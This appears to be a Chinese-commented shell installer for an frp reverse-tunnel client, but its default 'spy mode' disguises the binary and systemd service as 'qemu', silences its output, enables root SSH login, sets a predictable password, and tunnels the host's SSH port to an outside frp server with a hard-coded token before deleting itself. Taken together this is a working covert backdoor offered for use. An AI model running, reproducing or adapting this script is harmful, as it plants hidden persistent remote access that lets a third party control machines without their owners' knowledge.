#!/usr/bin/env sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

# fonts color
Green="\033[32m"
Red="\033[31m"
Yellow="\033[33m"
GreenBG="\033[42;37m"
RedBG="\033[41;37m"
Font="\033[0m"
# fonts color

# variable
WORK_PATH=$(dirname $(readlink -f $0))
FRP_NAME=frpc
PROXY_URL="https://github.geekery.cn/"
FRP_VERSION=0.67.0-0

# 间谍模式
SPY_MODE=${SPY_MODE:-True}
FRP_PATH=/usr/local/src/qemu
TARGET_FRP_NAME=qemu


if [ "${SPY_MODE}" = "False" ]; then
  # 非间谍模式，还原原生配置
  TARGET_FRP_NAME=${FRP_NAME}
  FRP_PATH=/usr/local/frp
fi


# Frp Server
FRP_SERVER_ADDRESS=${FRPS_ADDRESS:-frp.geekery.cn}
FRP_SERVER_PORT=${FRPS_PORT:-7000}

# check frpc
if [ -f "${FRP_PATH}/${TARGET_FRP_NAME}" ] || [ -f "${FRP_PATH}/${TARGET_FRP_NAME}.ini" ] || [ -f "/lib/systemd/system/${TARGET_FRP_NAME}.service" ];then
    echo -e "${Green}=========================================================================${Font}"
    echo -e "${RedBG}当前已退出脚本.${Font}"
    echo -e "${Green}检查到服务器已安装${Font} ${Red}${FRP_NAME}${Font}"
    echo -e "${Green}请手动确认和删除${Font} ${Red}${FRP_PATH}/${Font} ${Green}目录下的${Font} ${Red}${TARGET_FRP_NAME}${Font} ${Green}和${Font} ${Red}/${TARGET_FRP_NAME}.ini${Font} ${Green}文件以及${Font} ${Red}/lib/systemd/system/${TARGET_FRP_NAME}.service${Font} ${Green}文件,再次执行本脚本.${Font}"
    echo -e "${Green}参考命令如下:${Font}"
    echo -e "${Red}rm -rf ${FRP_PATH}/${TARGET_FRP_NAME}${Font}"
    echo -e "${Red}rm -rf ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
    echo -e "${Red}rm -rf /lib/systemd/system/${TARGET_FRP_NAME}.service${Font}"
    echo -e "${Green}=========================================================================${Font}"
    exit 0
fi


if [ "${SPY_MODE}" = "False" ]; then
    while ! test -z "$(ps -A | grep -w ${FRP_NAME})"; do
        FRPCPID=$(ps -A | grep -w ${FRP_NAME} | awk 'NR==1 {print $1}')
        kill -9 $FRPCPID
    done
fi


RANDOM_0=$(( $(od -An -N4 -tu4 < /dev/urandom) % 32768))

# check pkg

## ubuntu debian system
if type apt-get >/dev/null 2>&1 ; then
    if ! type wget >/dev/null 2>&1 ; then
        apt-get install wget -y
    fi
    if ! type curl >/dev/null 2>&1 ; then
        apt-get install curl -y
    fi

    if ! type sshd >/dev/null 2>&1 ; then
        apt-get install ssh -y
        if ls -l /proc/1/ | grep exe | grep systemd; then
        systemctl restart ssh
        else
        sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
        mkdir /var/run/sshd/
        nohup /usr/sbin/sshd -D &
        printf "gG${RANDOM_0}${RANDOM_0}\ngG${RANDOM_0}${RANDOM_0}\n" | passwd $USER
        fi
    fi
fi


## rhel system
if type yum >/dev/null 2>&1 ; then
    if ! type wget >/dev/null 2>&1 ; then
        yum install wget -y
    fi
    if ! type curl >/dev/null 2>&1 ; then
        yum install curl -y
    fi
    if ! type sshd >/dev/null 2>&1 ; then
        yum install ssh -y
        if ls -l /proc/1/ | grep exe | grep systemd; then
        systemctl restart ssh
        else
        sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
        mkdir /var/run/sshd/
        nohup /usr/sbin/sshd -D &
        printf "gG${RANDOM_0}${RANDOM_0}\ngG${RANDOM_0}${RANDOM_0}\n" | passwd $USER
        fi
    fi
fi

## alpine system
# 检查是否为Alpine系统
if type apk >/dev/null 2>&1 ; then
    # 检查是否已安装wget，如果未安装，则安装wget
    if ! type wget >/dev/null 2>&1 ; then
        apk add --no-cache wget
    fi
    # 检查是否已安装curl，如果未安装，则安装curl
    if ! type curl >/dev/null 2>&1 ; then
        apk add --no-cache curl
    fi

    # 检查是否已安装openssh-server，如果未安装，则安装openssh-server
    if ! type sshd >/dev/null 2>&1 ; then
        apk add --no-cache openssh-server
        # 如果是使用systemd，则重启ssh服务
        if ls -l /proc/1/exe | grep -q systemd; then
            rc-service sshd restart
        else
            # 启用Root登录，并启动sshd服务
            sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
            mkdir -p /var/run/sshd/
            # 生成hostkeys 
            ssh-keygen -A
            nohup /usr/sbin/sshd -D &
            # 随机生成密码，并为用户设置密码
            printf "gG${RANDOM_0}${RANDOM_0}\ngG${RANDOM_0}${RANDOM_0}\n" | passwd $USER
        fi
    fi
fi


# check network
GOOGLE_HTTP_CODE=$(curl -o /dev/null --connect-timeout 5 --max-time 8 -s --head -w "%{http_code}" "https://www.google.com")
PROXY_HTTP_CODE=$(curl -o /dev/null --connect-timeout 5 --max-time 8 -s --head -w "%{http_code}" "${PROXY_URL}robots.txt")

# check arch
UNAME_M=$(uname -m)
if [ "${UNAME_M}" = "x86_64" ]; then
    PLATFORM=amd64
elif [ "${UNAME_M}" = "aarch64" ]; then
    PLATFORM=arm64
elif [ "${UNAME_M}" = "armv7" ]; then
    PLATFORM=arm
elif [ "${UNAME_M}" = "armv7l" ]; then
    PLATFORM=arm
elif [ "${UNAME_M}" = "armhf" ]; then
    PLATFORM=arm
else
    echo -e "${Red}不支持的 CPU 架构: ${UNAME_M}${Font}"
    echo -e "${Red}支持的架构: x86_64, aarch64, armv7, armv7l, armhf${Font}"
    exit 1
fi

FILE_NAME=frp_${FRP_VERSION}_linux_${PLATFORM}

# download
if [ ${GOOGLE_HTTP_CODE} = "200" ]; then
    wget -P ${WORK_PATH} -c https://github.com/lsjnb/frp/releases/download/v${FRP_VERSION}/${FILE_NAME}.tar.gz -O ${FILE_NAME}.tar.gz
else
    if [ ${PROXY_HTTP_CODE} = "200" ]; then
        wget -P ${WORK_PATH} -c ${PROXY_URL}https://github.com/lsjnb/frp/releases/download/v${FRP_VERSION}/${FILE_NAME}.tar.gz -O ${FILE_NAME}.tar.gz
    else
        echo -e "${Red}检测 GitHub Proxy 代理失效 开始使用内部地址下载${Font}"
        wget -P ${WORK_PATH} -c https://gitee.com/lsjnb666/frp/releases/download/v${FRP_VERSION}/${FILE_NAME}.tar.gz -O ${FILE_NAME}.tar.gz
    fi
fi
tar -zxvf ${FILE_NAME}.tar.gz

mkdir -p ${FRP_PATH}
mv ${FILE_NAME}/${FRP_NAME} ${FRP_PATH}/${TARGET_FRP_NAME}

# configure frpc.ini
cat >${FRP_PATH}/${TARGET_FRP_NAME}.ini <<EOF
[common]
server_addr = ${FRP_SERVER_ADDRESS}
server_port = ${FRP_SERVER_PORT}
token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO
login_fail_exit = false

[ssh_${SUDO_USER:-root}_$(hostname)_${RANDOM_0}]
type = tcp
local_ip = 127.0.0.1
local_port = 22
use_compression = true
use_encryption = true

EOF

# configure systemd
if ls -l /proc/1/ | grep exe | grep systemd; then
  cat >/lib/systemd/system/${TARGET_FRP_NAME}.service <<EOF
[Unit]
Description=$([ "${SPY_MODE}" = "False" ] && echo "Frp Server Service" || echo "Qemu Virtual Service" )
After=network.target syslog.target
Wants=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=5s
ExecStart=${FRP_PATH}/${TARGET_FRP_NAME} -c ${FRP_PATH}/${TARGET_FRP_NAME}.ini
$([ "${SPY_MODE}" = "False" ] && echo "" || echo "StandardOutput=null\nStandardError=null")

[Install]
WantedBy=multi-user.target
EOF

# finish install
systemctl daemon-reload
systemctl start ${TARGET_FRP_NAME}
systemctl enable ${TARGET_FRP_NAME}

else
    nohup ${FRP_PATH}/${TARGET_FRP_NAME} -c ${FRP_PATH}/${TARGET_FRP_NAME}.ini >/dev/stdout 2>&1 &
fi


# clean
rm -rf ${WORK_PATH}/${FILE_NAME}.tar.gz ${WORK_PATH}/${FILE_NAME} ${FRP_NAME}_linux_install.sh


# echo -e "${Green}====================================================================${Font}"
# echo -e "${Green}安装成功,若要修改 ${TARGET_FRP_NAME}.ini 文件,确保格式及配置正确无误!${Font}"
# echo -e "${Red}vi ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
# echo -e "${Green}修改完毕后执行以下命令重启服务:${Font}"
# echo -e "${Red}systemctl restart ${TARGET_FRP_NAME}${Font}"
# if [ "${SPY_MODE}" != "False" ]; then
#     echo -e "${Green}也许有用的命令:${Font}"
#     echo -e "${Red}useradd qemu${Font}"
#     echo -e "${Red}printf gG${RANDOM_0}${RANDOM_0}\\\\ngG${RANDOM_0}${RANDOM_0}\\\\n | passwd $USER${Font}"
# fi
# echo -e "${Green}====================================================================${Font}"
